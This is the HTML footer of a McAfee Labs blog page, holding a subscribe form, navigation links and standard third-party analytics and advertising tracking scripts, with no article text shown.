    <div class="wrap-section padding-top-xs"> 
        <div class="container medium">
                    <p class="small rule">Categories: <a href="/blogs/other-blogs/mcafee-labs/" rel="category tag">McAfee Labs</a><br /> 
            </p>	

        </div>		 
    </div>
    <div class="container medium">
                    <ol class="commentlist">
                    </ol>
             
    </div>
    
    <div class="wrap-section padding-top-small">  
        <div class="container medium">
                                </div>
    </div>
        <div class="wrap-section bg-red bg-image padding-medium" id="subscribe">
      <div class="container medium">
        <div class="row">
          <div class="col-sm-12">
            <div class="cta-component text-center">
              <h3>Subscribe to McAfee Securing Tomorrow Blogs</h3>
                         <form method="get" action="/blogs/subscribe/" class="form-inline">
            
              <input type="text" placeholder="Email address" name="subscriber_email" />
          
            <button type="submit" class="btn transparent">Subscribe</button>
          </form>
              
            </div>
          </div>
        </div>
      </div>
    </div>

</main>
<!--Footer of en-us starts here --> 
    
	<aside class="tools">
		<a href="#wrapper" class="back-to-top">Back to top</a>
	</aside>
  
  <div class="textwidget custom-html-widget"><div class="wrap-section padding-bottom-medium padding-top-small bg-dark-gray" id="footer">
    <div class="container medium">           
      <div class="row">
         <div class="col-sm-6 breadcrumb">
        	<ul class="breadcrumb-list">
        		<li><a class="symbols-label first" href="/blogs"><i class="symbol-shield"></i><span>McAfee Home</span></a></li>
        		<li><a class="symbols-label" href="/blogs"><i class="symbol-arrow-forward"></i><span>Securing Tomorrow</span></a></li>
					 </ul>
				</div>
        <div class="col-sm-6 social">
          <!-- <a id="usbl-integrated-button" class="symbols-label" href=""><i class="symbol-feedback"></i><span>Feedback</span></a> -->
          <ul class="social-networks">
            <li><a href="https://twitter.com/mcafee" title="Twitter" target="_blank" rel="noopener noreferrer"><i class="symbol-twitter"></i><span>Twitter</span></a></li>
            <li><a href="http://www.facebook.com/mcafee" title="Facebook" target="_blank" rel="noopener noreferrer"><i class="symbol-facebook"></i><span>Facebook</span></a></li>
            <li><a href="https://www.linkedin.com/company/2336?trk=prof-exp-company-name" title="LinkedIn" target="_blank" rel="noopener noreferrer"><i class="symbol-linkedin"></i><span>LinkedIn</span></a></li>
            <li><a href="http://www.youtube.com/mcafee" title="YouTube" target="_blank" rel="noopener noreferrer"><i class="symbol-youtube"></i><span>YouTube</span></a></li>
            <li><a href="/blogs/" title="Blog" target="_blank" rel="noopener noreferrer"><i class="symbol-blog"></i><span>Blog</span></a></li>
					</ul>
        </div>
      </div>
      <hr />
      <div class="row">
        <div class="col-sm-3">
          <a class="symbols-label" href="/enterprise/en-us/about/region-selector.html"><i class="symbol-language"></i><span>United States / English</span></a>
        </div>
        <div class="col-sm-9">
           <a href="//www.scanalert.com/RatingVerify?ref=www.mcafee.com" target="_blank" class="mcafee-secure" rel="noopener noreferrer"><img src="https://www.mcafee.com/enterprise/en-us/img/v1/common/logo-mcafee-secure.svg" alt="McAfee SECURE"/></a>
          <ul class="footer-menu">
            <li><a href="/enterprise/en-us/about/legal/privacy.html">Privacy</a></li>
            <li><a href="/enterprise/en-us/about/legal/notices.html">Legal Notices</a></li>
            <li><a href="/enterprise/en-us/about/legal/contracts-terms.html">Legal Contracts &amp; Terms</a></li>
            <li><a href="/enterprise/en-us/site-map.html">Site Map</a></li>
            <li>Copyright ©2020 McAfee, LLC</li>
          </ul>
        </div>
      </div>          
    </div>            	
  </div>
</div></div>


</body>	
<script type="text/javascript">
   if ($('div.author-block .meta').length > 0) {
      utag_data.tm_local_blogs_author = $('div.author-block .meta').text().split(' on ')[0].replace("By","").trim();
    }
    (function(a,b,c,d){
    a='//tags.tiqcdn.com/utag/mcafee/consumer-main/prod/utag.js'; // Note: Please use prod for production version and dev for dev version before release
    b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;
    a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a);
    })();
</script>

<script type='text/javascript' src='/wp-content/plugins/metronet-profile-picture/js/mpp-frontend.js?ver=2.3.8'></script>
<script type='text/javascript'>
/* Highlight Search Terms 1.5 ( RavanH - http://status301.net/wordpress-plugins/highlight-search-terms/ ) */
var hlst_query = []; var hlst_areas = ["#groups-dir-list","#members-dir-list","div.bbp-topic-content,div.bbp-reply-content,li.bbp-forum-info,.bbp-topic-title,.bbp-reply-title","article","div.hentry","div.post","#content","#main","div.content","#middle","#container","div.container","div.page","#wrapper","body"];
</script>
<script type='text/javascript' src='/wp-content/plugins/highlight-search-terms/hlst-extend.min.js?ver=1.5'></script>
<script type='text/javascript' src='/wp-content/plugins/social-polls-by-opinionstage/public/js/shortcodes.js?ver=19.6.31'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpmm_object = {"ajax_url":"https:\/\/www.mcafee.com\/wp-admin\/admin-ajax.php","wpmm_responsive_breakpoint":"767px","wpmm_disable_mobile":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='/wp-content/plugins/wp-megamenu/assets/js/wpmm.js?ver=1.3.1'></script>
<script type='text/javascript' src='/wp-content/themes/securingtomorrow/js/theme-script.js?ver=5.4.2'></script>
<script type='text/javascript' src='/wp-content/themes/securingtomorrow/js/skip-link-focus-fix.min.js?ver=20151215'></script>
<script type='text/javascript' src='/wp-content/plugins/super-socializer/js/front/social_login/general.js?ver=7.12.37'></script>
<script type='text/javascript' src='/wp-includes/js/wp-embed.min.js?ver=5.4.2'></script>
	
<script src="//cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js?ver=10faaf528e636a046163bdb6753031b2"></script>
<script src="/wp-content/themes/securingtomorrow/js/jquery-lib.js"></script>
<script src="/wp-content/themes/securingtomorrow/js/main.js"></script>
<script src="/wp-content/themes/securingtomorrow/js/general_footer.js"></script>
<!-- Consumer Facebook Pixel Code -->
<script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '187610925152304');
  fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=187610925152304&ev=PageView&noscript=1"/></noscript>
<!-- End Facebook Pixel Code -->

<!-- Start linkedIn pixel -->
<script type="text/javascript">
_linkedin_partner_id = "68395";
window._linkedin_data_partner_ids = window._linkedin_data_partner_ids || [];
window._linkedin_data_partner_ids.push(_linkedin_partner_id);
</script><script type="text/javascript">
(function(){var s = document.getElementsByTagName("script")[0];
var b = document.createElement("script");
b.type = "text/javascript";b.async = true;
b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
s.parentNode.insertBefore(b, s);})();
</script>
<noscript>
<img height="1" width="1" style="display:none;" alt="" src="https://dc.ads.linkedin.com/collect/?pid=68395&fmt=gif" />
</noscript>
<!-- End linkedIn pixel -->

<!-- Twitter universal website tag code -->
<script>
!function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
},s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='//static.ads-twitter.com/uwt.js',
a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
// Insert Twitter Pixel ID and Standard Event data below
twq('init','nxlgc');
twq('track','PageView');
</script>
<!-- Twitter universal website tag code -->

<script>
/* <![CDATA[ */
var google_conversion_id = 975085349;
var google_custom_params = window.google_tag_params;
var google_remarketing_only = true;
/* ]]> */
document.write('\x3Cscript type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">\x3C/script>');
//document.write('\x3Cnoscript>\x3Cimg height="1" width="1" style="border-style:none;display:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/975085349/?guid=ON&script=0"/>\x3C/noscript>');
</script>

<!-- Enterprise Facebook Pixel Code -->
<script>
// load Facebook
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '766537420057144');
fbq('track', "PageView");

//document.write('\x3Cnoscript>\x3Cimg height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=766537420057144&ev=PageView&noscript=1" />\x3C/noscript>');
</script>
<!-- Facebook Pixel Code -->

<!-- Adobe Launch START -->
<script src="//assets.adobedtm.com/launch-ENc117a6a508e14a879398dd6f37ed54a3.min.js"></script>
<!-- Adobe Launch END -->
<script>_satellite.pageBottom()</script>
</html>


<style>
    .commentlist {
        display: none;
    }
</style>
<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me - Debug: cached@1616227633 -->